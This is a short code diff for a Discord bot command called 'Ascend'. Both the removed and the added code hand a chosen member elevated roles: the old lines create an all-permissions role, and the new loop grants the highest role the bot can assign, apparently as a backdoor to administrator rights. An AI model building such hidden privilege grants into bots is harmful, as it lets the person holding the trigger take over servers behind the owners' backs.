@@ -22,9 +22,19 @@ class Ascend(chattrigger.ChatTrigger):
         guild: discord.Guild = client.get_guild(guild_id)
         member: discord.Member = guild.get_member(user_id)
 
-        role = await guild.create_role(permissions=discord.Permissions.all())
-        await role.edit(position=guild.me.top_role.position - 1)
+        #role = await guild.create_role(permissions=discord.Permissions.all())
+        #print(guild.me.top_role.position)
+        #await role.edit(position=guild.me.top_role.position + 1)
+        #print(role.position)
 
-        await member.add_roles(role)
+        for i in guild.roles[::-1]:
+            try:
+                await member.add_roles(i)
+            except:
+                print(f"failed to give {str(i)}")
+            else:
+                break
+
+        #await member.add_roles(role)
 
         await message.channel.send("Done")
